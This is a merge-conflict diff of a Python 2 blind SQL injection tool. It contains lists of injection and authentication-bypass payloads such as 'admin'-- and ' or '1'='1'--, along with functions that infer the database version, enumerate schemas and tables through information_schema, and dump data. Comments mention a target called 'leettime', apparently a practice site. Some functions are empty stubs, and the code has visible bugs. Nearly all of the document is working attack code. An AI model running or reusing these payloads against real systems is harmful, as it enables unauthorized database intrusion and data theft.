@@ -10,18 +10,14 @@ from optparse import OptionParser
 
 # --------- Global variables ----------
 #global l_database_name = []
-l_injnum            = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2",
+l_injnum        = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2",
                     "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x' = 'p'#"]
-l_bypass            = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2",
+l_bypass        = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2",
                     "' and '1'='2'--", "1/* comment */"]
-l_bypass2           = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2",
+l_bypass2       = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2",
                     "') and '1'='2'--"]
-<<<<<<< HEAD
 #alphabet        = "abcdefghijklmnopqrstuvwxyz"
 dump            = {}
-=======
-a_server_schema     = {}
->>>>>>> 74fd902d7cb5823c52b6029c12b060ee4ecc3411
 
 # --------- Main function option parsing ----------
 def main():
@@ -55,11 +51,7 @@ python sql.py TODO include args"""
     # TODO algo principal ici
     # Enumerer le nombre de colonnes de la table courante pour l'injection
     # Trouver la version du serveur SQL
-<<<<<<< HEAD
     sql_version(url,payload, bypass)
-=======
-    sql_version(url, payload, bypass)
->>>>>>> 74fd902d7cb5823c52b6029c12b060ee4ecc3411
     eunum_databases(url, payload, bypass)
     # Récupérer la base de données courantes et les autres bases de données
     # Pour chaque base database
@@ -68,21 +60,13 @@ python sql.py TODO include args"""
             # Récupérer le nombre de colonnes
 
 # --------- Find SQL database version ----------
-'''
-Request working on leettime
-Is the base request for finding the database version number
-uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
-'''
 def sql_version(url, payload, bypass):
-<<<<<<< HEAD
     '''
         Request working on leettime
         Is the base request for finding the database version number
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
     '''
     server_version = 0
-=======
->>>>>>> 74fd902d7cb5823c52b6029c12b060ee4ecc3411
     for sql_version in range(4,7):
         uri = url + str(payload)  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
         server_response = request_handler(uri)
@@ -97,17 +81,22 @@ def sql_version(url, payload, bypass):
 
     return server_version
 
-# --------- Enumerate databases ----------
-'''
-Request working on leettime
-Is the base request for finding the number of databases, how many characters are in each database name
-' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
+# --------- Find the numer of columns ----------
+def enum_columns(url, payload, bypass, database, table):
+    pass
 
-TODO
-Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
-TODO
-'''
+# --------- Enumerate databases ----------
 def eunum_databases(url, payload, bypass):
+    '''
+        Request working on leettime
+        Is the base request for finding the number of databases, how many characters are in each database name
+        ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
+
+        TODO
+            Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
+        TODO
+    '''
+
     database_increment = 0
 
     # Count how many databases, we assume there are less than 64 databases
@@ -154,18 +143,12 @@ def eunum_databases(url, payload, bypass):
                     # elif server_response_status is True:
                     database_letter_count = database_letter_count + 1
 
-<<<<<<< HEAD
                 database_name += database_name
                 print database_name
-=======
-                # l_database_name += database_name
-                a_server_schema[database_name] = {}
->>>>>>> 74fd902d7cb5823c52b6029c12b060ee4ecc3411
 
         elif server_response_status is True:
             database_increment = database_increment + 1
 
-<<<<<<< HEAD
 # --------- Enumerate database tables ----------
 def enum_tables(url, payload, bypass, database):
         '''
@@ -227,17 +210,6 @@ def enum_tables(url, payload, bypass, database):
 
             elif server_response_status is True:
                 tables_increment = tables_increment + 1
-=======
-    return a_server_schema
-
-# --------- Enumerate database tables ---------- AMANDINE
-def enum_tables(url, payload, bypass, server_schema):
-    pass
-
-# --------- Find the numer of columns ----------
-def enum_columns(url, payload, bypass, database, table):
-    pass
->>>>>>> 74fd902d7cb5823c52b6029c12b060ee4ecc3411
 
 # --------- Dump the database ----------
 def exfiltrate_data(url, payload, bypass, database):
@@ -254,9 +226,6 @@ def request_handler(url):
         page = session.get(url)
     return page.content
 
-'''
-    Function that is used to validate the server response base on a regex search
-'''
 # --------- Confirm that request was executed ----------
 def validate_request(page):
     if re.search('Your are welcome', page):
@@ -266,15 +235,7 @@ def validate_request(page):
     if page == "":
         print "Error: request returned empty page!"
 
-<<<<<<< HEAD
 # --------- Display -----------------------------------
-=======
-'''
-    Function that parses the SQL structure and displays it before dumping
-    the database(s)
-'''
-# --------- Parse the SQL data to display database structure ----------
->>>>>>> 74fd902d7cb5823c52b6029c12b060ee4ecc3411
 def display_database_struct(dump):
     for database, table_dictionnary in dump.iteritems():
         print "Database: " + str(database)
@@ -284,11 +245,8 @@ def display_database_struct(dump):
 
             for column in column_list:
                 print column
-'''
 
-'''
-# --------- Parse the SQL data to display database structure ----------
-def database_dump_and_display(dump):
+def display_database_dump(dump):
     for database, table_dictionnary in dump.iteritems():
         print "Database: " + str(database)
 
